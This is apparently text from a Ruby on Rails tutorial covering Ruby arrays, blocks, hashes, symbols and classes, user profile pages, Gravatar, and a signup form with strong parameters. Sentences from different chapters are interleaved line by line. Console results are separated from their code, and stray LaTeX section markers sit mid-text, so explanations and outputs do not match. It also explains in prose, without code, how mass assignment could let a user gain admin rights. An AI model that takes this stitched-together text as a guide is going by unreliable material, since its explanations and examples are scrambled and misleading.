Well, there will still be \emph{one} thing left that we don't understand, which is how Rails ties this all together: mapping URLs to actions, making the \kode{full\_title} helper available in views, etc. This is an interesting subject, and I encourage you to investigate it further, but knowing exactly \emph{how} Rails works is not necessary when \emph{using} Rails.
Naturally, since Heroku is a platform for production sites, it runs each application in a production environment.
(For a deeper understanding, I recommend \emph{The Rails~4 Way} by Obie Fernandez.)
To make the debug output look nice, we'll add some rules to the custom stylesheet created in Chapter~\ref{cha:filling_in_the_layout}, as shown in Listing~\ref{code:mixin_and_debug}.
in Listing~\ref{code:annotated_title_helper}.
Adding code for a pretty debug box, including a Sass mixin.
An annotated \kode{title\_helper}.
This introduces the Sass \emph{mixin} facility, in this case called \kode{box\_sizing}.
# Documentation comment
A mixin allows a group of CSS rules to be packaged up and used for multiple elements, converting
Method
We'll put this mixin to use again in Section~\ref{sec:using_form_for}.
The result in the case of the debug box is shown in Figure~\ref{fig:home_page_with_debug}.
# Boolean test
The sample application Home page with debug information.
The debug output in Figure~\ref{fig:home_page_with_debug} gives potentially useful information about the page being rendered:
The Rails \kode{debug} information is shown as \href{http://www.yaml.org/}{YAML} (a \href{http://catb.org/jargon/html/R/recursive-acronym.html}{recursive acronym} standing for ``YAML Ain't Markup Language''), which is a friendly data format designed to be both machine- \emph{and} human-readable.
We'll see another example in Section~\ref{sec:a_users_resource}.
In order to make a user profile page, we need to have a user in the database, which introduces a chicken-and-egg problem: how can the site have a user before there is a working signup page?
Happily, this problem has already been solved: in Section~\ref{sec:creating_and_authenticating_a_user}, we created a User record by hand using the Rails console, so there should be one user in the database:
(Thanks to reader Jeremy Fleischman for pointing out this subtle issue.)
(If you don't currently have a user in your database, you should visit Section~\ref{sec:creating_and_authenticating_a_user} now and complete it before proceeding.)
The final element is \kode{module ApplicationHelper}: modules give us a way to package together related methods, which can then be \emph{mixed in} to Ruby classes using \kode{include}.
We see from the console output above that the user has id~\kode{1}, and our goal now is to make a page to display this user's information.
When writing ordinary Ruby, you often write modules and include them explicitly yourself, but in the case of a helper module Rails handles the inclusion for us.
The result is that the \kode{full\_title} method is \href{http://catb.org/jargon/html/A/automagically.html}{automagically} available in all our views.
When following REST principles, resources are typically referenced using the resource name and a unique identifier.
<n><n>    % subsection back_to_the_title_helper (end)<n><n>  \section{Other data structures} % (fold)<n>  \label{sec:other_data_structures}<n><n>
What this means in the context of users---which we're now thinking of as a Users \emph{resource}---is that we should view the user with id~\kode{1} by issuing a \texttt{GET} request to the URL /users/1.
Although web apps are ultimately about strings, actually \emph{making} those strings requires using other data structures as well.
Here the \kode{show} action is \emph{implicit} in the type of request---when Rails' REST features are activated, \texttt{GET} requests are automatically handled by the \kode{show} action.
In this section, we'll learn about some Ruby data structures important for writing Rails applications.
We saw in Section~\ref{sec:a_user_tour} that the page for a user with id~\kode{1} has URL /users/1.
<n><n>    \subsection{Arrays and ranges} % (fold)<n>    \label{sec:arrays_and_ranges}<n><n>
An array is just a list of elements in a particular order.
Unfortunately, visiting that URL right now just gives an error, as seen in the server log (Figure~\ref{fig:profile_routing_error}).
We haven't discussed arrays yet in the \emph{Rails Tutorial}, but understanding them gives a good foundation for understanding hashes (Section~\ref{sec:hashes_and_symbols}) and for aspects of Rails data modeling (such as the \kode{has\_many} association seen in Section~\ref{sec:demo_user_has_many_microposts} and covered more in Section~\ref{sec:user_micropost_associations}).
The server log error for /users/1.
So far we've spent a lot of time understanding strings, and there's a natural way to get from strings to arrays using the \kode{split} method:
We can get the routing for /users/1 to work by adding a single line to our routes file (\kode{config/routes.rb}):
The result appears in Listing~\ref{code:users_resource}
The result of this operation is an array of three strings.
Adding a Users resource to the routes file.
By default, \kode{split} divides a string into an array by splitting on whitespace, but you can split on nearly anything else as well:
page to show user
/users/1
As is conventional in most computer languages, Ruby arrays are \emph{zero-offset}, which means that the first element in the array has index~0, the second has index~1, and so on:
This means that the \emph{routing} works, but the corresponding pages don't necessarily work at this point.
=> [42, 8, 17]
For example, /users/1/edit gets routed properly to the \kode{edit} action of the Users controller, but since the \kode{edit} action doesn't exist yet actually hitting that URL will return an error.
=> 42
The resulting correspondence of URLs, actions, and named routes is shown in Table~\ref{table:RESTful_users}.
=> 17
(Compare to Table~\ref{table:demo_RESTful_users}.)
Over the course of the next three chapters, we'll cover all of the other entries in Table~\ref{table:RESTful_users} as we fill in all the actions necessary to make Users a fully RESTful resource.
We see here that Ruby uses square brackets to access array elements.
In addition to this bracket notation, Ruby offers synonyms for some commonly accessed elements
The \kode{second} method used here isn't currently part of Ruby itself, but rather is added by Rails.
/users
It works in this case because the Rails console automatically includes the Rails extensions to Ruby.
page to list all users
/users/new
This last line introduces the equality comparison operator \kode{==}, which Ruby shares with many other languages, along with the associated \kode{!=} (``not equal''), etc.:
page to make a new user (signup)
create a new user
/users/1/edit
page to edit user with id \kode{1}
update user
In addition to \kode{length} (seen in the first line above), arrays respond to a wealth of other methods:
delete user
RESTful routes provided by the Users resource in Listing~\ref{code:users_resource}.
With the code in Listing~\ref{code:users_resource}, the routing works, but there's still no page there (Figure~\ref{fig:user_show_unknown_action}).
=> [8, 17, 42]
To fix this, we'll begin with a minimalist version of the profile page, which we'll flesh out in Section~\ref{sec:a_gravatar_image}.
=> [17, 8, 42]
The URL /users/1 with routing but no page.
=> [17, 42, 8]
in Listing~\ref{code:stub_user_view}.
Note that none of the methods above changes \kode{a} itself.
A stub view for showing user information.
To \emph{mutate} the array, use the corresponding ``bang'' methods (so-called because the exclamation point is usually pronounced ``bang'' in this context):
This view uses embedded Ruby to display the user's name and email address, assuming the existence of an instance variable called \kode{@user}.
Of course, eventually the real user show page will look very different (and won't display the email address publicly).
=> [42, 8, 17, 6]
=> [42, 8, 17, 6, 7]
=> [42, 8, 17, 6, 7, "foo", "bar"]
This last example shows that you can chain pushes together, and also that, unlike arrays in many other languages, Ruby arrays can contain a mixture of different types (in this case, integers and strings).
Before we saw \kode{split} convert a string to an array.
We can also go the other way with the \kode{join} method:
In order to get the user show view to work, we need to define an \kode{@user} variable in the corresponding \kode{show} action in the Users controller.
=> [42, 8, 17, 7, "foo", "bar"]
As you might expect, we use the \kode{find} method on the User model (Section~\ref{sec:finding_user_objects}) to retrieve the user from the database, as shown in Listing~\ref{code:user_show_action}.
=> "428177foobar"
The Users controller with a \kode{show} action.
=> "42, 8, 17, 7, foo, bar"
Closely related to arrays are \emph{ranges}, which can probably most easily be understood by converting them to arrays using the \kode{to\_a} method:
Here we've used \kode{params} to retrieve the user~id.
=> 0..9
When we make the appropriate request to the Users controller, \kode{params[:id]} will be the user id~\texttt{1}, so the effect is the same as the \kode{find} method \kode{User.find(1)} we saw in Section~\ref{sec:finding_user_objects}.
NoMethodError: undefined method `to_a' for 9:Fixnum
(Technically, \kode{params[:id]} is the string~\kode{"1"}, but \kode{find} is smart enough to convert this to an integer.)
=> [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
With the user view and action defined, the URL \href{http://localhost:3000/users/1}{/users/1} works perfectly, as seen in Figure~\ref{fig:user_show_rails}.
Though \kode{0..9} is a valid range, the second expression above shows that we need to add parentheses to call a method on it.
(If you haven't restarted the Rails server since adding bcrypt, you may have to do so at this time.)
Ranges are useful for pulling out array elements:
This is why the code
in Listing~\ref{code:user_show_action} finds the user with id~\texttt{1}.
=> ["foo", "bar", "baz", "quux"]
The user show page after adding a Users resource.
We saw in Section~\ref{sec:a_users_resource} how the information in the \kode{debug} could help us understand what's going on in our application.
A particularly useful trick is to use the index -1 at the end of the range to select every element from the starting point to the end of the array \emph{without} explicitly having to use the array's length:
As of Rails 4.2, there's an even more direct way to get debugging information using the \texttt{byebug} gem (Listing~\ref{code:gemfile_sample_app}).
To see how it works, we just need to add a line consisting of \kode{debugger} to our application, as shown in Listing~\ref{code:debugger}.
=> [2, 3, 4, 5, 6, 7, 8, 9]
The Users controller with a debugger.
Ranges also work with characters:
Now, when we visit /users/1, the Rails server shows a \kode{byebug} prompt:
=> ["a", "b", "c", "d", "e"]
We can treat this like a Rails console, issuing commands to figure out the state of the application:
Both arrays and ranges respond to a host of methods that accept \emph{blocks}, which are simultaneously one of Ruby's most powerful and most confusing features:
To release the prompt and continue execution of the application, press Ctrl-D, then remove the \kode{debugger} line from the \kode{show} action (Listing~\ref{code:debugger_removed}).
=> 1..5
The Users controller with the debugger line removed.
The vertical bars around the variable name in~\kode{|i|} are Ruby syntax for a block variable, and it's up to the method to know what to do with the block.
In this case, the range's \kode{each} method can handle a block with a single local variable, which we've called~\kode{i}, and it just executes the block for each value in the range.
Whenever you're confused about something in a Rails application, it's a good practice to put \kode{debugger} close to the code you think might be causing the trouble.
Curly braces are one way to indicate a block, but there is a second way as well:
Inspecting the state of the system using \texttt{byebug} is a powerful method for tracking down application errors and interactively debugging your application.
Having defined a basic user page in the previous section, we'll now flesh it out a little with a profile image for each user and the first cut of the user sidebar.
We'll start by adding a ``globally recognized avatar'', or \href{http://gravatar.com/}{Gravatar}, to the user profile
Blocks can be more than one line, and often are.
In Hinduism, an avatar is the manifestation of a deity in human or animal form.
In the \emph{Rails Tutorial} we'll follow the common convention of using curly braces only for short one-line blocks and the \kode{do..end} syntax for longer one-liners and for multi-line blocks:
By extension, the term \emph{avatar} is commonly used to mean some kind of personal representation, especially in a virtual environment.
Here I've used \kode{number} in place of~\kode{i} just to emphasize that any variable name will do.
 Gravatar is a free service that allows users to upload images and associate them with email addresses they control.
Unless you already have a substantial programming background, there is no shortcut to understanding blocks; you just have to see them a lot, and eventually you'll get used to them
Gravatars are a convenient way to include user profile images without going through the trouble of managing image upload, cropping, and storage; all we need to do is construct the proper Gravatar image URL using the user's email address and the corresponding Gravatar image will automatically appear
Programming experts, on the other hand, might benefit from knowing that blocks are \emph{closures}, which are one-shot anonymous functions with data attached.
(We'll learn how to handle custom image upload in Section~\ref{sec:micropost_images}.)
Luckily, humans are quite good at making generalizations from concrete examples; here are a few more, including a couple using the \kode{map} method:
Our plan is to define a \kode{gravatar\_for} helper function to return a Gravatar image for a given user, as shown in Listing~\ref{code:user_show_view_with_gravatar}.
"Betelgeuse!"
The user show view with name and Gravatar.
By default, methods defined in any helper file are automatically available in any view, but for convenience we'll put the \kode{gravatar\_for} method in the file for helpers associated with the Users controller.
=> [1, 4, 9, 16, 25]
As noted in the \href{http://en.gravatar.com/site/implement/hash/}{Gravatar documentation}, Gravatar URLs are based on an \href{http://en.wikipedia.org/wiki/MD5}{MD5 hash} of the user's email address.
In Ruby, the MD5 hashing algorithm is implemented using the \kode{hexdigest} method, which is part of the \kode{Digest} library:
=> ["a", "b", "c"]
=> ["A", "B", "C"]
=> "1fda4469bcbec3badf5418269ffc5968"
Since email addresses are case-insensitive (Section~\ref{sec:format_validation}) but MD5 hashes are not, we've used the \kode{downcase} method to ensure that the argument to \kode{hexdigest} is all lower-case.
As you can see, the \kode{map} method returns the result of applying the given block to each element in the array or range.
(Because of the email downcasing callback in Listing~\ref{code:email_downcase}, this will never make a difference in this tutorial, but it's a good practice in case the \kode{gravatar\_for} ever gets used on email addresses from other sources.)
In the final two examples, the block inside \kode{map} involves calling a particular method on the block variable, and in this case there's a commonly used shorthand:
The resulting \kode{gravatar\_for} helper appears in  Listing~\ref{code:gravatar_for_helper}.
Defining a \kode{gravatar\_for} helper method.
(This strange-looking but compact code uses a \emph{symbol}, which we'll discuss in Section~\ref{sec:hashes_and_symbols}.)
The code in Listing~\ref{code:gravatar_for_helper} returns an image tag for the Gravatar with a \kode{gravatar} CSS class and alt text equal to the user's name (which is especially convenient for sight-impaired users using a screen reader).
One interesting thing about this construction is that it was originally added to Ruby on Rails, and people liked it so much that it has now been incorporated into core Ruby.
The profile page appears as in Figure~\ref{fig:profile_with_gravatar}, which shows the default Gravatar image, which appears because \kode{user@example.com} isn't a real email address.
As one final example of blocks, we can take a look at an individual test from the file in Listing~\ref{code:home_base_title_spec}:
(In fact, as you can see by visiting it, the \href{http://www.example.com/}{example.com} domain is reserved for examples like this one.)
The user profile page with the default Gravatar.
It's not important to understand the details (and in fact \emph{I} don't know the details offhand), but we can infer from the presence of the \kode{do} keyword that the body of the test is a block.
The \kode{test} method takes in a string argument (the description) and a block, and then executes the body of the block as part of running the test suite.
By the way, we're now in a position to understand the line of Ruby I threw into Section~\ref{sec:heroku_commands} to generate random subdomains:
Let's build it up step-by-step:
=> ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o",
The user show page with a custom Gravatar.
"p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
The last element needed to complete the mockup from Figure~\ref{fig:profile_mockup_profile_name} is the initial version of the user sidebar.
=> ["c", "g", "l", "k", "h", "z", "s", "i", "n", "d", "y", "u", "t", "j", "q",
We'll implement it using the \kode{aside} tag, which is used for content (such as sidebars) that complements the rest of the page but can also stand alone.
"b", "r", "o", "f", "e", "w", "v", "m", "a", "x", "p"]
We include \kode{row} and \kode{col-md-4} classes, which are both part of Bootstrap.
=> ["f", "w", "i", "a", "h", "p", "c", "x"]
The code for the modified user show page appears in Listing~\ref{code:user_show_with_sidebar}.
=> "mznpybuj"
Adding a sidebar to the user \kode{show} view.
Hashes are essentially arrays that aren't limited to integer indices.
(In fact, some languages, especially Perl, sometimes call hashes \emph{associative arrays} for this reason.)
Instead, hash indices, or \emph{keys}, can be almost any object.
For example, we can use strings as keys:
With the HTML elements and CSS classes in place, we can style the profile page (including the sidebar and the Gravatar) with the SCSS shown in Listing~\ref{code:sidebar_css}
Listing~\ref{code:sidebar_css} includes the \kode{.gravatar\_edit} class, which we'll put to work in Chapter~\ref{cha:updating_showing_and_deleting_users}.
(Note the nesting of the table CSS rules, which works only because of the Sass engine used by the asset pipeline.)
The resulting page is shown in Figure~\ref{fig:user_show_sidebar_css}.
=> {"last_name"=>"Hartl", "first_name"=>"Michael"}
SCSS for styling the user show page, including the sidebar.
It's important to note that the curly braces for hashes have nothing to do with the curly braces for blocks.
Now that we have a working (though not yet complete) user profile page, we're ready to make a signup form for our site.
(Yes, this can be confusing.)
We saw in Figure~\ref{fig:new_signup_page} (shown again in Figure~\ref{fig:blank_signup_page_recap}) that the signup page is currently blank: useless for signing up new users.
Although hashes resemble arrays, one important difference is that hashes don't generally guarantee keeping their elements in a particular order
The goal of this section is to start changing this sad state of affairs by producing the signup form mocked up in Figure~\ref{fig:signup_mockup}.
Ruby versions 1.9 and later actually guarantee that hashes keep their elements in the same order entered, but it would be unwise ever to count on a particular ordering.
The current state of the signup page  \href{http://localhost:3000/signup}{/signup}.
If order matters, use an array.
Instead of defining hashes one item at a time using square brackets, it's easy to use a literal representation with keys and values separated by~\kode{=>}, called a ``hashrocket'':
Since we're about to add the ability to create new users through the web, let's remove the user created at the console in Section~\ref{sec:creating_and_authenticating_a_user}.
The cleanest way to do this is to reset the database with the \kode{db:migrate:reset} Rake task:
Here I've used the usual Ruby convention of putting an extra space at the two ends of the hash---a convention ignored by the console output.
On some systems you might have to restart the web server (using Ctrl-C) for the changes to take effect.
(Don't ask me why the spaces are conventional; probably some early influential Ruby programmer liked the look of the extra spaces, and the convention stuck.)
The heart of the signup page is a \emph{form} for submitting the relevant signup information (name, email, password, confirmation).
So far we've used strings as hash keys, but in Rails it is much more common to use \emph{symbols} instead.
We can accomplish this in Rails with the \kode{form\_for} helper method, which takes in an Active Record object and constructs a form using the object's attributes.
Symbols look kind of like strings, but prefixed with a colon instead of surrounded by quotes.
Recalling that the signup page /signup is routed to the \kode{new} action in the Users controller (Listing~\ref{code:signup_route}), our first step is to create the User object required as an argument to \kode{form\_for}.
For example, \kode{:name} is a symbol.
The resulting \kode{@user} variable definition appears in Listing~\ref{code:new_action_with_user}.
Adding an \kode{@user} variable to the \kode{new} action.
You can think of symbols as basically strings without all the extra baggage
As a result of having less baggage, symbols are easier to compare to each other; strings need to be compared character by character, while symbols can be compared all in one go.
The form itself appears as in Listing~\ref{code:signup_form}.
We'll discuss it in detail in Section~\ref{sec:the_form_html}, but first let's style it a little with the SCSS in Listing~\ref{code:form_css}.
This makes them ideal for use as hash keys.
(Note the reuse of the \kode{box\_sizing} mixin from Listing~\ref{code:mixin_and_debug}.)
Once these CSS rules have been applied, the signup page appears as in Figure~\ref{fig:signup_form}.
=> ["n", "a", "m", "e"]
A form to sign up new users.
NoMethodError: undefined method `split' for :name:Symbol
=> "raboof"
NoMethodError: undefined method `reverse' for :foobar:Symbol
CSS for the signup form.
Symbols are a special Ruby data type shared with very few other languages, so they may seem weird at first, but Rails uses them a lot, so you'll get used to them fast.
The user signup form.
Unlike strings, not all characters are valid:
To understand the form defined in Listing~\ref{code:signup_form}, it's helpful to break it into smaller pieces.
As long as you start your symbols with a letter and stick to normal word characters, you should be fine.
We'll first look at the outer structure, which consists of embedded Ruby opening with a call to \kode{form\_for} and closing with \kode{end}:
In terms of symbols as hash keys, we can define a \kode{user} hash as follows:
The presence of the \kode{do} keyword indicates that \kode{form\_for} takes a block with one variable, which we've called \kode{f} (for ``form'').
As is usually the case with Rails helpers, we don't need to know any details about the implementation, but what we \emph{do} need to know is what the \kode{f} object does: when called with a method corresponding to an \href{http://www.w3schools.com/html/html_forms.asp}{HTML form element}---such as a text field, radio button, or password field---\kode{f} returns code for that element specifically designed to set an attribute of the \kode{@user} object.
=> {:name=>"Michael Hartl", :email=>"michael@example.com"}
We see here from the last example that the hash value for an undefined key is simply \kode{nil}.
Since it's so common for hashes to use symbols as keys, as of version 1.9 Ruby supports a new syntax just for this special case:
creates the HTML needed to make a labeled text field element appropriate for setting the \kode{name} attribute of a User model.
If you look at the HTML for the generated form by Ctrl-clicking and using the ``inspect element'' function of your browser, the page's source should look something like Listing~\ref{code:signup_form_html}.
Let's take a moment to discuss its structure.
The second syntax replaces the symbol/hashrocket combination with the name of the key followed by a colon and a value:
The HTML for the form in Figure~\ref{fig:signup_form}.
This construction more closely follows the hash notation in other languages (such as JavaScript) and enjoys growing popularity in the Rails community.
Because both hash syntaxes are still in common use, it's essential to be able to recognize both of them.
We'll start with the internal structure of the document.
Unfortunately, this can be confusing, especially since \kode{:name} is valid on its own (as a standalone symbol) but \kode{name:} has no meaning by itself.
Comparing Listing~\ref{code:signup_form} with Listing~\ref{code:signup_form_html}, we see that the embedded Ruby
The bottom line is that \kode{:name =>} and \kode{name:} are effectively the same \emph{only inside literal hashes}, so that
produces the HTML
are equivalent, but otherwise you need to use \kode{:name} (with the colon coming first) to denote a symbol
As seen in Figure~\ref{fig:filled_in_form}, text and email fields (\kode{type="text"} and \linebreak \kode{type="email"}) simply display their contents, whereas password fields \linebreak (\kode{type="password"}) obscure the input for security purposes, as seen in Figure~\ref{fig:filled_in_form}.
(The benefit of using an email field is that some systems treat it differently from a text field; for example, the code \kode{type="email"} will cause some mobile devices to display a special keyboard optimized for entering email addresses.)
A filled-in form with \kode{text} and \kode{password} fields.
As we'll see in Section~\ref{sec:successful_signups}, the key to creating a user is the special \kode{name} attribute in each \kode{input}:
The second important element is the \kode{form} tag itself.
Together, these constitute instructions to issue an HTTP \texttt{POST} request to the /users URL.
 We'll see in the next two sections what effects this has.
(You may also have noticed the code that appears just inside the \kode{form} tag:
Hash values can be virtually anything, even other hashes, as seen in Listing~\ref{code:nested_hashes}.
This code, which isn't displayed in the browser, is used internally by Rails, so it's not important for us to understand what it does.
Nested hashes.
See \href{http://stackoverflow.com/questions/941594/understand-rails-authenticity-token}{the Stack Overflow entry on the Rails authenticity token} if you're interested in the details of how this works.
Although we've briefly examined the HTML for the form in Figure~\ref{fig:signup_form} (shown in Listing~\ref{code:signup_form_html}), we haven't yet covered any details, and the form is best understood in the context of \emph{signup failure}.
=> {:name=>"Michael Hartl", :email=>"mhartl@example.com"}
In this section, we'll create a signup form that accepts an invalid submission and re-renders the signup page with a list of errors, as mocked up in Figure~\ref{fig:signup_failure_mockup}.
=> {:user=>{:name=>"Michael Hartl", :email=>"mhartl@example.com"}}
A mockup of the signup failure page.
\label{fig:signup_failure_mockup}}<n>\end{figure}<n><n>    \subsection{A working form} % (fold)<n>    \label{sec:a_working_form}<n><n>
These sorts of hashes-of-hashes, or \emph{nested hashes}, are heavily used by Rails, as we'll see starting in Section~\ref{sec:unsuccessful_signups}.
Recall from Section~\ref{sec:a_users_resource} that adding \kode{resources :users} to the \kode{routes.rb} file (Listing~\ref{code:users_resource}) automatically ensures that our Rails application responds to the RESTful URLs from Table~\ref{table:RESTful_users}.
As with arrays and ranges, hashes respond to the \kode{each} method.
In particular, it ensures that a \texttt{POST} request to /users is handled by the \kode{create} action.
For example, consider a hash named \kode{flash} with keys for two conditions, \kode{:success} and \kode{:danger}:
Our strategy for the \kode{create} action is to use the form submission to make a new user object using \kode{User.new}, try (and fail) to save that user, and then render the signup page for possible resubmission.
"It worked!"
Let's get started by reviewing the code for the signup form:
It failed.
As noted in Section~\ref{sec:the_form_html}, this HTML issues a \texttt{POST} request to the /users URL.
Our first step toward a working signup form is adding the code in Listing~\ref{code:first_create_action}.
This listing includes a second use of the \kode{render} method, which we first saw in the context of partials (Section~\ref{sec:partials}); as you can see, \kode{render} works in controller actions as well.
Key :success has value "It worked!"
Note that we've taken this opportunity to introduce an \kode{if}-\kode{else} branching structure, which allows us to handle the cases of failure and success separately based on the value of \kode{@user.save}, which (as we saw in Section~\ref{sec:creating_user_objects}) is either \kode{true} or \kode{false} depending on whether or not the save succeeds.
A \kode{create} action that can handle signup failure.
Note that, while the \kode{each} method for arrays takes a block with only one variable, \kode{each} for hashes takes two, a \emph{key} and a \emph{value}.
Thus, the \kode{each} method for a hash iterates through the hash one key-value \emph{pair} at a time.
The last example uses the useful \kode{inspect} method, which returns a string with a literal representation of the object it's called on:
[1, 2, 3, 4, 5]
# Handle a successful save.
Note the comment: this is not the final implementation.
It worked!
But it's enough to get us started, and we'll finish the implementation in Section~\ref{sec:strong_parameters}.
The best way to understand how the code in Listing~\ref{code:first_create_action} works is to \emph{submit} the form with some invalid signup data.
By the way, using \kode{inspect} to print an object is common enough that there's a shortcut for it, the \kode{p} function
The result appears in Figure~\ref{fig:signup_failure}, and the full debug information (with an increased font size) appears in Figure~\ref{fig:signup_failure_rails_debug}.
There's actually a subtle difference, which is that \kode{p} returns the object being printed while \kode{puts} always returns \kode{nil}.
(Figure~\ref{fig:signup_failure} also shows the \emph{web console}, which opens a Rails console in the browser to assist in debugging.
(Thanks to reader Katarzyna Siwek for pointing this out.)
It's useful for examining, e.g., the User model, but in this case we need to inspect \kode{params}, which is not available in the web console as far as I can tell.)
Signup failure.
<n>\end{code}<n><n>    % subsection hashes_and_symbols (end)<n><n>    \subsection{CSS revisited} % (fold)<n>    \label{sec:css_revisited}<n><n>
It's time now to revisit the line from Listing~\ref{code:application_layout_redux} used in the layout to include the cascading style sheets:
Signup failure debug information.
We are now nearly in a position to understand this.
To get a better picture of how Rails handles the submission, let's take a closer look at the \kode{user} part of the parameters hash from the debug information (Figure~\ref{fig:signup_failure_rails_debug}):
As mentioned briefly in Section~\ref{sec:motivation}, Rails defines a special function to include stylesheets, and
This hash gets passed to the Users controller as part of \kode{params}, and we saw starting in Section~\ref{sec:a_users_resource} that the \kode{params} hash contains information about each request. In the case of a URL like /users/1, the value of \kode{params[:id]} is the \kode{id} of the corresponding user (\kode{1}~in this example).
is a call to this function.
In the case of posting to the signup form, \kode{params} instead contains a hash of hashes, a construction we first saw in Section~\ref{sec:hashes_and_symbols}, which introduced the strategically named \kode{params} variable in a console session.
But there are several mysteries.
The debug information above shows that submitting the form results in a \kode{user} hash with attributes corresponding to the submitted values, where the keys come from the \kode{name} attributes of the \kode{input} tags seen in Listing~\ref{code:signup_form}; for example, the value of
First, where are the parentheses?
In Ruby, they are optional, so these two are equivalent:
with name \kode{"user[email]"} is precisely the \kode{email} attribute of the \kode{user} hash.
# Parentheses on function calls are optional.
in Listing~\ref{code:first_create_action}.
Second, the \kode{media} argument sure looks like a hash, but where are the curly braces?
This means that the line
When hashes are the \emph{last} argument in a function call, the curly braces are optional, so these two are equivalent:
is mostly equivalent to
# Curly braces on final hash arguments are optional.
In previous versions of Rails, using
actually worked, but it was insecure by default and required a careful and error-prone procedure to prevent malicious users from potentially modifying the application database.
Next, why does the \kode{data-turbolinks-track} key-value pair use the old-style hashrocket syntax?
This is because using the newer syntax to write
In Rails version later than 4.0, this code raises an error (as seen in Figure~\ref{fig:signup_failure} and Figure~\ref{fig:signup_failure_rails_debug} above), which means it is secure by default.
<n><n>    % subsection a_working_form (end)<n><n>    \subsection{Strong parameters} % (fold)<n>    \label{sec:strong_parameters}<n><n>
is invalid because of the hyphens.
We mentioned briefly in Section~\ref{sec:a_user_class} the idea of \emph{mass assignment}, which involves initializing a Ruby variable using a hash of values, as in
(Recall from Section~\ref{sec:hashes_and_symbols} that hyphens can't be used in symbols.)
This forces us to use the older syntax, yielding
The comment included in Listing~\ref{code:first_create_action} and reproduced above indicates that this is not the final implementation.
The reason is that initializing the entire \kode{params} hash is \emph{extremely} dangerous---it arranges to pass to \kode{User.new} \emph{all} data submitted by a user.
Finally, why does Ruby correctly interpret the lines
In particular, suppose that, in addition to the current attributes, the User model included an \kode{admin} attribute used to identify administrative users of the site.
even with a line break between the final elements?
(We will implement just such an attribute in Section~\ref{sec:administrative_users}.)
The answer is that Ruby doesn't distinguish between newlines and other whitespace in this context
The way to set such an attribute to \kode{true} is to pass the value \kode{admin='1'} as part of \kode{params[:user]}, a task that is easy to accomplish using a command-line HTTP client such as \texttt{curl}.
A newline is what comes at the end of a line, thereby starting a new line.
The \emph{reason} I chose to break the code into pieces is that I prefer to keep lines of source code under 80 characters for legibility
The result would be that, by passing in the entire \kode{params} hash to \kode{User.new}, we would allow any user of the site to gain administrative access by including \kode{admin='1'} in the web request.
Actually \emph{counting} columns could drive you crazy, which is why many text editors have a visual aid to help you.
Previous versions of Rails used a method called \kode{attr\_accessible} in the \emph{model} layer to solve this problem, and you may still see that method in legacy Rails applications, but as of Rails~4.0 the preferred technique is to use so-called \emph{strong parameters} in the controller layer.
For example, if you take a look back at Figure~\ref{fig:cloud9_gemfile}, you'll see a small vertical line on the right to help keep code under 80 characters.
This allows us to specify which parameters are \emph{required} and which ones are \emph{permitted}.
The cloud IDE (Section~\ref{sec:development_environment}) includes such a line by default.
In addition, passing in a raw \kode{params} hash as above will cause an error to be raised, so that Rails applications are now immune to mass assignment vulnerabilities by default.
If you use TextMate, you can find this feature under \texttt{View > Wrap Column > 78}.
In Sublime Text, you can use \texttt{View > Ruler > 78} or \texttt{View > Ruler > 80}.
In the present instance, we want to require the \kode{params} hash to have a \kode{:user} attribute, and we want to permit the name, email, password, and password confirmation attributes (but no others).
So, we see now that the line
calls the \kode{stylesheet\_link\_tag} function with two arguments: a string, indicating the path to the stylesheet, and a hash with two elements, indicating the media type and telling Rails to use the \href{https://github.com/rails/turbolinks}{turbolinks} feature added in Rails~4.0.
This code returns a version of the \kode{params} hash with only the permitted attributes (while raising an error if the \kode{:user} attribute is missing).
(You may see some extra things, like \kode{?body=1}, after the CSS filenames.
To facilitate the use of these parameters, it's conventional to introduce an auxiliary method called \kode{user\_params} (which returns an appropriate initialization hash) and use it in place of \kode{params[:user]}:
These are inserted by Rails to ensure that browsers reload the CSS when it changes on the server.)
Since \kode{user\_params} will only be used internally by the Users controller and need not be exposed to external users via the web, we'll make it \emph{private} using Ruby's \kode{private} keyword, as shown in Listing~\ref{code:create_action_strong_parameters}.
The HTML source produced by the CSS includes.
(We'll discuss \kode{private} in more detail in Section~\ref{sec:remember_me}.)
We'll set about changing this in Chapter~\ref{cha:filling_in_the_layout}.
We've said before that everything in Ruby is an object, and in this section we'll finally get to define some of our own.
Using strong parameters in the \kode{create} action.
Ruby, like many object-oriented languages, uses \emph{classes} to organize methods; these classes are then \emph{instantiated} to create objects.
If you're new to object-oriented programming, this may sound like gibberish, so let's look at some concrete examples.
<n><n><n>    \subsection{Constructors} % (fold)<n>    \label{sec:constructors}<n><n>
We've seen lots of examples of using classes to instantiate objects, but we have yet to do so explicitly.
For example, we instantiated a string using the double quote characters, which is a \emph{literal constructor} for strings:
=> String
We see here that strings respond to the method \kode{class}, and simply return the class they belong to.
Instead of using a literal constructor, we can use the equivalent \emph{named constructor}, which involves calling the \kode{new} method on the class name
By the way, the extra level of indentation on the \kode{user\_params} method is designed to make it visually apparent which methods are defined after \kode{private}.
These results will vary based on the version of Ruby you are using.
(Experience shows that this is a wise practice; in classes with a large number of methods, it is easy to define a private method accidentally, which leads to considerable confusion when it isn't available to call on the corresponding object.)
This example assumes you are using Ruby~1.9.3 or later.
At this point, the signup form is working, at least in the sense that it no longer produces an error upon submission.
On the other hand, as seen in Figure~\ref{fig:invalid_submission_no_feedback}, it doesn't display any feedback on invalid submissions (apart from the development-only debug area), which is potentially confusing.
It also doesn't actually create a new user.
We'll fix the first issue in Section~\ref{sec:signup_error_messages} and the second in Section~\ref{sec:successful_signups}.
This is equivalent to the literal constructor, but it's more explicit about what we're doing.
The signup form submitted with invalid information.
Arrays work the same way as strings:
=> [1, 3, 2]
As a final step in handling failed user creation, we'll add helpful error messages to indicate the problems that prevented successful signup.
Hashes, in contrast, are different.
Conveniently, Rails automatically provides such messages based on the User model validations.
While the array constructor \kode{Array.new} takes an initial value for the array, \kode{Hash.new} takes a \emph{default} value for the hash, which is the value of the hash for a nonexistent key:
For example, consider trying to save a user with an invalid email address and with a password that's too short:
=> ["Email is invalid", "Password is too short (minimum is 6 characters)"]
When a method gets called on the class itself, as in the case of \kode{new}, it's called a \emph{class method}.
The result of calling \kode{new} on a class is an object of that class, also called an \emph{instance} of the class.
A method called on an instance, such as \kode{length}, is called an \emph{instance method}.
When learning about classes, it's useful to find out the \emph{class hierarchy} using the \kode{superclass} method:
